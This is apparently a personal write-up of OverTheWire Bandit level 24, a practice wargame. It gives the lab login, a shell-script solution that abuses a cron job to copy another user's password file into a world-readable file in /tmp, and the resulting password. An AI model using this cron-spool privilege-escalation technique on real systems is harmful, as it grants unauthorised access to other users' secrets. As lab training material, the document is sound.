## Level 24
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso
	Server: bandit.labs.overthewire.org
	User: bandit23
	Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
	
## Solución
	ls /etc/cron.d
	cat /etc/cron.d/cronjob_bandit24
	cat /usr/bin/cronjob_bandit24.sh
	mkdir /tmp/elcajero
	cd /tmp/elcajero
	echo "cat /etc/bandit_pass/bandit24 > /tmp/elcajero/password" >script.sh
	chmod 777 script.sh
	touch password
	chmod 666 password
	cp script.sh /var/spool/bandit24/foo	
	cat password


	VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Notas adicionales

## Referencias